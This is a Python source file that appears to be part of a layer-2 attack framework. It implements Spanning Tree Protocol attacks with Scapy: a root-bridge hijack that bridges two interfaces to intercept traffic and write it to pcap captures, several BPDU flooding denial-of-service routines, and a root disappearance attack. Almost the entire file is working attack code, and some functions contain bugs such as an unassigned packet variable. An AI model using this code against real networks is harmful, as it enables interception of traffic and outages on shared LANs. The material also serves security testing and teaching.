from datetime import datetime
import multiprocessing
from scapy.layers.l2 import *
from scapy.packet import *
from scapy.sendrecv import sniff, bridge_and_sniff
from scapy.utils import PcapWriter
from scapy.all import RandMAC, Packet
from time import sleep
import asyncio
 
from libs.aux_funcs import type_wrapper, attack_layer,attack_cat,attack_type,send_l2_single, EXIT_SIGNAL

global pcap

# NOTE: this function does not work with middlewares for VLANs (double tagging), but can be modified to work
@type_wrapper(category=attack_cat.Attack, name="Root Bridge Hijack MitM", type=attack_type.MitM, layer=attack_layer.L2, arg_list=["interface2"])
def stp_root_bridge_mitm(args):

    """Perfoms a STP Root bridge hijack and MitM.
    Requires one additional argument:
    arg         desc                            example value
    interface2  Second interface                eth1"""

    def bridge_func(packet):
        global pcap
        if packet.haslayer(STP) or packet.haslayer(LLC):
            return False
        pcap.write(packet)
        print(f"Sniffed packet on interface: {packet.__repr__()}\n")
        return True

    def bridge_wrapper(i1, i2):
        global pcap 
        pcap = PcapWriter(f"/captures/STP_MITM-{datetime.now().strftime('%d-%m-%Y-%H%M%S')}.pcap")
        try:
            bridge_and_sniff(i1, i2, bridge_func, bridge_func)
        except KeyboardInterrupt:
            print("Received int")
        finally:
            pcap.flush()
            pcap.close()
            return


    async def hijack_coro(interface, params):
        # Obtain BPDU params
        root_id = params['rootid']
        bridge_id = params['bridgeid']
        bridgeMAC = params['bridgemac']
        rootMAC = params['rootmac']

        # Final BDPU
        pkt = Dot3(dst="01:80:c2:00:00:00", src = bridgeMAC)/LLC()/STP(bpdutype=0x00, bpduflags=0x01, portid=0x8002, rootmac = rootMAC, \
            bridgemac = bridgeMAC, rootid= root_id, bridgeid = bridge_id)

        # While coroutine is alive, send BPDU in loop
        while True:
            p_sniff = srp1(pkt, iface=interface, verbose = 0, timeout = 2)
            # Send ack to received BPDU
            if p_sniff is not None and STP in p_sniff and p_sniff[Dot3].src != rootMAC:
                pkt_ack = Dot3(dst="01:80:c2:00:00:00", src = bridgeMAC)/LLC()/STP(bpdutype=0x00, bpduflags=0x81, portid=0x8002, rootmac = rootMAC, \
                bridgemac = bridgeMAC, rootid= root_id, bridgeid = bridge_id)
                sendp(pkt_ack, iface=interface)
            await asyncio.sleep(1)

    async def main_coro(i1, i2, params):   

        # Set up process for bridge function
        multiprocessing.set_start_method('fork')
        proc = multiprocessing.Process(target=bridge_wrapper, args = (i1,i2))
        proc.start()
        
        # Create the tasks in asyncio
        gth = asyncio.gather(asyncio.create_task(hijack_coro(i1,params)), asyncio.create_task(hijack_coro(i2,params)))
    
        while not EXIT_SIGNAL.is_set():
            await asyncio.sleep(0.5)
        
        # On interrupt, stop both the gather and the bridge process
        try:
            raise KeyboardInterrupt()
        except KeyboardInterrupt:
            gth.cancel()
            proc.join()
        
        return

    # Variable Assignment
    i1 = args['iface']
    i2 = args['interface2']

    # Sniff a BPDU from any interface
    p = sniff(stop_filter=lambda x: x.haslayer(STP), iface=i1)

    # Scrape parameters from BPDU packet
    pkts = p.sessions()['Other']

    for x in pkts:
        if STP in x:
            STP_pkt = x
            break

    root_id = STP_pkt.rootid
    root_mac = STP_pkt.rootmac

    # Modify root and bridge mac to have lower mac than current root bridge
    root_mac_int = int(root_mac.replace(':',''), 16)
    root_mac_int -=1
    root_mac_hex = "{:012x}".format(root_mac_int)
    root_mac = ":".join(root_mac_hex[i:i+2] for i in range(0, len(root_mac_hex), 2))

    params = {"rootmac": root_mac, "bridgemac":root_mac, "rootid":root_id, "bridgeid":root_id}

    #Start the attack
    asyncio.run(main_coro(i1,i2,params))
    return


    

@type_wrapper(category=attack_cat.Attack, name="Conf BPDU DoS", type=attack_type.DoS, layer=attack_layer.L2, arg_list=[])
def stp_conf_bpdu_dos(args):

    """Performs a DoS attack utilizing STP Conf BPDUs. 
    Requires no aditional arguments"""

    interface = args["interface"]
    pkt = args['pkt']

    # Sniff a BPDU
    p = sniff(stop_filter=lambda x: x.haslayer(STP), iface=interface)

    # Scrape parameters from BPDU
    pkts = p.sessions()['Other']

    for x in pkts:
        if STP in x:
            STP_pkt = x
            break

    root_id = STP_pkt.rootid
    bridge_id = STP_pkt.bridgeid

    # Start the attack
    
    while not EXIT_SIGNAL.is_set():
        # Generate Random Mac Address
        randMac = RandMAC()
        # Check for pre-existing layers (VLAN info)
        if pkt != None and pkt.haslayer(Dot1Q):
            pkt = pkt/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = randMac, \
                bridgemac= randMac, rootid = root_id, bridgeid = bridge_id)
            if pkt.haslayer(Ether):
                pkt[Ether].dst = "01:00:0c:cc:cc:cd"
                pkt[Ether].src = randMac

        else:
            pkt = Dot3(dst="01:80:c2:00:00:00", src = randMac)/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = randMac, \
                bridgemac= randMac, rootid = root_id, bridgeid = bridge_id)

        # Send the packet
        args['pkt'] = pkt
        send_l2_single(args)

    
    return 0


@type_wrapper(category=attack_cat.Attack, name="TCN BPDU DoS", type=attack_type.DoS, layer=attack_layer.L2, arg_list=[])
def stp_tcn_bpdu_dos(args):
    
    while not EXIT_SIGNAL.is_set():
        # Generate Random Mac Address
        randMac = RandMAC()

        # Check for pre-existing layers (VLAN info)
        if pkt != None and pkt.haslayer(Dot1Q):
            pkt = pkt/LLC()/STP(bpdutype=0x80)
            if pkt.haslayer(Ether):
                pkt[Ether].dst = "01:00:0c:cc:cc:cd"
                pkt[Ether].src = randMac

        else:
            pkt = Dot3(dst="01:80:c2:00:00:00", src = randMac)/LLC()/STP(bpdutype=0x80) 

        # Send the packet
        args['pkt'] = pkt
        send_l2_single(args)
           
    
    return 0


@type_wrapper(category = attack_cat.Attack, name="Eternal Root Election", type=attack_type.DoS, layer=attack_layer.L2, arg_list=[])       
def stp_eternal_root_election(args):

    interface = args["iface"]
    pkt = args['pkt']

    # Sniff a BPDU
    print("Sniffing a BPDU...")
    p = sniff(stop_filter=lambda x: x.haslayer(STP), iface=interface)
    print("Found BPDU.")

    # Scrape parameters from BPDU
    pkts = p.sessions()['Other']

    for x in pkts:
        if STP in x:
            STP_pkt = x
            break

    root_id = STP_pkt.rootid
    bridge_id = STP_pkt.bridgeid

    root_mac = STP_pkt.rootmac
    bridge_mac = STP_pkt.bridgemac

    # Turn root and bridge mac into int format
    root_mac_int = int(root_mac.replace(':',''), 16)    
    bridge_mac_int = int(bridge_mac.replace(':',''), 16) 

    # Start the attack
    
    while not EXIT_SIGNAL.is_set() or root_mac_int > 0:
    
        # Lower MAC address by 1
        root_mac_int -=1
        root_mac_hex = "{:012x}".format(root_mac_int)
        root_mac = ":".join(root_mac_hex[i:i+2] for i in range(0, len(root_mac_hex), 2))

        bridge_mac_int -=1
        bridge_mac_hex = "{:012x}".format(bridge_mac_int)
        bridge_mac = ":".join(bridge_mac_hex[i:i+2] for i in range(0, len(bridge_mac_hex), 2))
        
        # Build the packet
        # Check for pre-existing layers (VLAN info)
        if pkt != None and pkt.haslayer(Dot1Q):
            pkt = pkt/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = root_mac, \
                bridgemac= bridge_mac, rootid = root_id, bridgeid = bridge_id)
            if pkt.haslayer(Ether):
                pkt[Ether].dst = "01:00:0c:cc:cc:cd"
                pkt[Ether].src = bridge_mac

        else:
            pkt = Dot3(dst="01:80:c2:00:00:00", src = bridge_mac)/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = root_mac, \
                bridgemac= bridge_mac, rootid = root_id, bridgeid = bridge_id)
            
        args['pkt'] = pkt
        send_l2_single(args)
        sleep(0.5)

        if root_mac_int == 0:
            print("MAC address pool exhausted")
    
        return 0

@type_wrapper(category=attack_cat.Attack, name="Root Disappearance", type=attack_type.DoS, layer=attack_layer.L2, arg_list=[])
def stp_root_disappearance(args):

    interface = args["iface"]
    pkt = args['pkt']

    # Sniff a BPDU
    p = sniff(stop_filter=lambda x: x.haslayer(STP), iface=interface)

    # Scrape parameters from BPDU
    pkts = p.sessions()['Other']

    for x in pkts:
        if STP in x:
            STP_pkt = x
            break

    root_id = STP_pkt.rootid
    bridge_id = STP_pkt.bridgeid

    root_mac = STP_pkt.rootmac
    bridge_mac = STP_pkt.bridgemac

    maxAge = STP_pkt.maxage

    # Modify root and bridge mac
    root_mac_int = int(root_mac.replace(':',''), 16)
    root_mac_int -=1
    root_mac_hex = "{:012x}".format(root_mac_int)
    root_mac = ":".join(root_mac_hex[i:i+2] for i in range(0, len(root_mac_hex), 2))

    bridge_mac_int = int(bridge_mac.replace(':',''), 16)
    bridge_mac_int -=1
    bridge_mac_hex = "{:012x}".format(bridge_mac_int)
    bridge_mac = ":".join(bridge_mac_hex[i:i+2] for i in range(0, len(bridge_mac_hex), 2))

    # Start the attack
    while not EXIT_SIGNAL.is_set():
        
        # Build the packet
        # Check for pre-existing layers (VLAN info)
        if pkt != None and pkt.haslayer(Dot1Q):
            pkt = pkt/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = root_mac, \
                bridgemac= bridge_mac, rootid = root_id, bridgeid = bridge_id)
            if pkt.haslayer(Ether):
                pkt[Ether].dst = "01:00:0c:cc:cc:cd"
                pkt[Ether].src = bridge_mac
        else:
            pkt = Dot3(dst="01:80:c2:00:00:00", src = bridge_mac)/LLC()/STP(bpdutype=0x00, bpduflags=0x01,rootmac = root_mac, \
                bridgemac= bridge_mac, rootid = root_id, bridgeid = bridge_id)

        sendp(pkt, iface=interface)

        sleep(int(maxAge)+ 3)

    
    return 0